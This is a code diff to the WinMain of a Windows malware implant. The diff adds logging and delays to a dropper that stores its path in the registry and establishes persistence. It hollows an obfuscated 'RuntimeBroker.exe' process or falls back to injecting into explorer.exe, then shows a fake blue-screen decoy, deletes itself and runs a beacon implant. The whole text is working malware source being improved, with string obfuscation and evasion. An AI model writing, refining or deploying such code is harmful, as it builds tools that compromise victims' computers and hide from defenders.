@@ -84,8 +84,12 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
                 LOG_INFO("IPC: Found dropper: " + utils::ws2s(dropperPath));
                 Sleep(20000);
                 persistence::establishPersistence(dropperPath);
+            } else {
+                LOG_WARN("IPC: Failed to read path.");
             }
             RegCloseKey(hKey);
+        } else {
+            LOG_WARN("IPC: Failed to open key.");
         }
         beacon::Beacon implant;
         implant.run();
@@ -105,7 +109,11 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     LOG_INFO("ROLE: Dropper.");
     HKEY hKey;
     if (RegCreateKeyExW(HKEY_CURRENT_USER, utils::DecryptW(kVolatileEnv).c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
-        RegSetValueExW(hKey, utils::DecryptW(kDropperPath).c_str(), 0, REG_SZ, (LPBYTE)currentPathBuf, (DWORD)(wcslen(currentPathBuf) + 1) * sizeof(wchar_t));
+        if (RegSetValueExW(hKey, utils::DecryptW(kDropperPath).c_str(), 0, REG_SZ, (LPBYTE)currentPathBuf, (DWORD)(wcslen(currentPathBuf) + 1) * sizeof(wchar_t)) == ERROR_SUCCESS) {
+             LOG_INFO("IPC: Stored path successfully.");
+        } else {
+             LOG_ERR("IPC: Failed to store path.");
+        }
         RegCloseKey(hKey);
     }
 
@@ -119,8 +127,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         // "RuntimeBroker.exe" -> \x10\x31\x3A\x30\x2D\x29\x31\x00\x36\x3B\x2F\x31\x36\x54\x31\x2C\x31
         std::wstring target = std::wstring(systemPath) + L"\\" + utils::DecryptW(L"\x10\x31\x3A\x30\x2D\x29\x31\x00\x36\x3B\x2F\x31\x36\x54\x31\x2C\x31");
 
+        LOG_INFO("Hollowing target: " + utils::ws2s(target));
         if (evasion::Injector::HollowProcess(target, selfImage)) {
-            LOG_INFO("Relocation successful. Showing decoy.");
+            LOG_INFO("Relocation successful. Waiting for foothold...");
+            Sleep(15000); // Wait for foothold to start
             decoy::ShowBSOD();
             CoUninitialize();
             utils::SelfDeleteAndExit();
@@ -129,7 +139,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
         LOG_WARN("Hollowing failed. Trying explorer.exe injection...");
         if (evasion::Injector::InjectIntoExplorer(selfImage)) {
-            LOG_INFO("Injection success.");
+            LOG_INFO("Injection success. Waiting for foothold...");
+            Sleep(15000); // Wait for foothold to start
             decoy::ShowBSOD();
             CoUninitialize();
             utils::SelfDeleteAndExit();
@@ -137,7 +148,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         }
     }
 
-    LOG_WARN("Relocation failed completely. Installing persistence and launching stable copy.");
+    LOG_WARN("Relocation failed completely. Launching stable copy.");
     std::wstring persistPath = persistence::establishPersistence();
     if (!persistPath.empty() && lstrcmpiW(currentPathBuf, persistPath.c_str()) != 0) {
         LOG_INFO("Launching stable copy: " + utils::ws2s(persistPath));
